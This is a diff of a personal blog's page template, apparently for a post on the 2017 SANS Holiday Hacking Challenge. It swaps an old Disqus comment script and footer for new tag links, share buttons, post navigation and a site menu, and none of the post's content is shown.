-					<li><a href="/categories/pentest">pentest</a> </li>
-					
-				</ul>
-				<p></p>
-				
+              <footer class="post-footer">
+                  <div class="post-tags">
+            
+            
+                <a href="https://simpleguy.tech/tags/sans">SANS</a>
+            
+                <a href="https://simpleguy.tech/tags/hhc">HHC</a>
+            
+            
+                  </div>
+                
+                    <div class="post-share">
+                        <a class="fa fa-reddit-alien" href="//www.reddit.com/submit" onclick="window.location = '//www.reddit.com/submit?url=' + encodeURIComponent(window.location); return false">
+                            <span>Reddit</span>
+                        </a>
+                        <a class="fa fa-twitter" href="https://twitter.com/share?text=2017%20SANS%20Holiday%20Hacking%20Challenge&url=https%3a%2f%2fsimpleguy.tech%2fpost%2f2017-sans-holiday-hacking-challenge%2f" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                            <span>Twitter</span>
+                        </a>
+                    </div>
+            
+              </footer>
 
-				
-				
-			</div>
-			
-				<h2>Comments</h2>
-				<div id="disqus_thread"></div>
-<script type="text/javascript">
-     
-    var disqus_shortname = 'asimpleguy'; 
+            
+                <aside class="post-comments">
+    
+    
+    <div id="disqus_thread"></div>
+    <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    
+    
+</aside>
 
-     
-    (function() {
-        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
-        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
-        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
-    })();
-</script>
-<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+            
+            </div>
+
+            <nav class="post-nav">
+                
+                
+                    <a class="post-nav-item post-nav-prev" href="https://simpleguy.tech/post/ub-lockdown-v3/">
+                        <section class="post-nav-teaser">
+                            <span class="post-nav-icon"><i class="fa fa-chevron-right"></i></span>
+                            <span class="post-nav-info">
+                                <h4 class="post-nav-title">UB Lockdown V3</h4>
+                            </span>
+                        </section>
+                    </a>
+                
+                <div class="clear"></div>
+            </nav>
+
+        </div>
+    </article>
+</main>
+
+                <div id="body-class" style="display: none;"></div>
+                <footer id="footer">
+                    <section class="credits">
+                        <span class="credits-license"><i class="fa fa-copyright"></i>2018 Simple Guy
+                    </span>
+                    </section>
+                </footer>
+                
+
+                
+<div id="menu" data-target="menu">
+    <div class="menu-header">
+        <span class="menu-label">Main Menu</span>
+        <a class="menu-close" data-action="menu" data-target="menu"></a>
+    </div>
+
+    <div class="menu-list">
+        
+        
+        <li class="menu-list-item">
+            
+            <a class="home current js-ajax-link" href="/about">About me</a>
+        </li>
+        
+        
+        <li class="menu-list-item">
+            
+            <a class="home current js-ajax-link" href="/projects">Projects</a>
+        </li>
+        
+        
+        <li class="menu-list-item">
+            
+            <a class="home current js-ajax-link" href="/tags">Tags</a>
+        </li>
+        
+        
+        <li class="menu-list-item">
+            
+            <a class="home current js-ajax-link" href="/categories">Categories</a>
+        </li>
+        
+        <li class="menu-list-item menu-list-social">
+            <a href="https://twitter.com/flyingpassword" title="Simple Guy on Twitter"><i class="fa fa-twitter"></i></a>
+            <a href="https://linkedin.com/in/ducphanduy" title="Simple Guy on LinkedIn"><i class="fa fa-linkedin"></i></a>
+            <a href="https://github.com/ducphanduyagentp" title="Simple Guy on GitHub"><i class="fa fa-github"></i></a>
+        </li>
+    </div>
+
 </div>
-			
-		</div>
 
-  </body>
+
+                
+                <div class="overlay"></div>
+            </div>
+        </section>
+
+    <script async src="/js/main.js"></script>
+
+
+
+  <noscript><link rel="stylesheet" href="/css/main.css"></noscript>
+</body>
 </html>
+
